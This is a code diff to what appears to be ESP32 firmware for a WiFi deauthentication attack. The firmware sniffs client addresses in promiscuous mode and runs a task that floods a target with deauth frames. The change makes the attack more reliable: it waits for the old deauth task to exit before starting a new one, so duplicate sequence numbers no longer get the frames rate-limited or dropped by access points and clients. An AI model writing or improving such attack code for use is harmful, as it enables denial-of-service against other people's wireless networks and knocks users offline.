@@ -42,6 +42,11 @@ static volatile uint32_t s_errs    = 0;
 static uint8_t           s_target[6];
 static uint8_t           s_channel;
 static uint16_t          s_seq = 0;
+/* Task handle so resume() can wait for the old deauth_task to fully
+ * exit before spawning a new one — previously they could briefly
+ * double-run and stamp duplicate sequence numbers. */
+static TaskHandle_t      s_deauth_task      = nullptr;
+static volatile bool     s_deauth_task_alive = false;
 
 /* Learned client table — populated by the promisc sniffer, read by
  * deauth_task. Dual-core safe via spinlock. */
@@ -92,6 +97,7 @@ static void sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
 
 static void deauth_task(void *)
 {
+    s_deauth_task_alive = true;
     esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
 
     while (s_running) {
@@ -129,6 +135,7 @@ static void deauth_task(void *)
          * total airtime. */
         if (n == 0) delay(30);
     }
+    s_deauth_task_alive = false;
     vTaskDelete(nullptr);
 }
 
@@ -224,7 +231,7 @@ void feat_wifi_deauth(void)
     esp_wifi_set_promiscuous_rx_cb(sniff_cb);
 
     s_running = true;
-    xTaskCreate(deauth_task, "deauth", 3072, nullptr, 4, nullptr);
+    xTaskCreate(deauth_task, "deauth", 3072, nullptr, 4, &s_deauth_task);
     sfx_deauth_burst();
 
     ui_clear_body();
@@ -274,17 +281,21 @@ void feat_wifi_deauth(void)
             state_changed = true;
             if (paused) { s_running = false; }
             else {
-                /* Give the old task a window to notice s_running=false and
-                 * exit its inner delay(3) loop before spawning a fresh one,
-                 * so we don't briefly double-run deauth_task on both cores. */
-                delay(30);
+                /* Wait for the old task to fully exit before spawning a
+                 * new one — otherwise they briefly run concurrently and
+                 * both stamp &s_seq, producing duplicate sequence numbers
+                 * that modern APs/clients rate-limit or drop. */
+                uint32_t deadline = millis() + 500;
+                while (s_deauth_task_alive && millis() < deadline) delay(5);
                 s_running = true;
-                xTaskCreate(deauth_task, "deauth", 3072, nullptr, 4, nullptr);
+                xTaskCreate(deauth_task, "deauth", 3072, nullptr, 4, &s_deauth_task);
             }
         }
     }
 
     s_running = false;
-    delay(150);
+    /* Same wait on feature exit so SIGTERM / stop is clean. */
+    uint32_t deadline = millis() + 500;
+    while (s_deauth_task_alive && millis() < deadline) delay(5);
     wifi_silent_ap_end();
 }
